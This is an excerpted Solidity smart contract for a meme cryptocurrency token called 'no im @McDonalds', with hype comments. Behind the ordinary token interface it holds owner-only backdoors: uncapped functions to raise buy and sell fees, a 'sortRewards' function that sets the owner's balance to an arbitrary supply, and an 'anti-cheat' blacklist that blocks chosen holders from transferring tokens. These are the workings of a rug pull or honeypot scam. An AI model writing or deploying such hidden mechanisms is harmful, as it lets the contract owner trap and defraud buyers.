...
// https://twitter.com/McDonalds/status/1521143128073424897
// NEW HYPE LIKE GRIMACE LETS FUCKING GO
...
contract NoImAtMcDonalds is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "no im @McDonalds";
    string private _symbol = "MCDONALDS";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0x0De3F22F1Cd63a4eaA4eeb9B2F4759baE1897743);
    ...
    uint256 public _TreasuryFeeBuy = 3;
    uint256 public _LiquidityFeeSell = 2;
    uint256 public _TreasuryFeeSell = 3;
    ...
    uint256 public dividendEndSupply = 100000000000000;
    ...
    function setSAmount(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
        _LiquidityFeeSell = newLiquidTax;
        _TreasuryFeeSell = newMarketTax;
        _finalSellTax = _LiquidityFeeSell.add(_TreasuryFeeSell);
    }

    function setBAmount(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function sortRewards()  public onlyOwner()   {_accBalances[getOwner()] = setDividendSupply; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isCheater[sender], "Account is a Cheater");
        if(inSwapAndLiquify)
        { 
    ...
    function setAntiCheat(address _account) external onlyOwner {
        isCheater[_account] = true;
    }
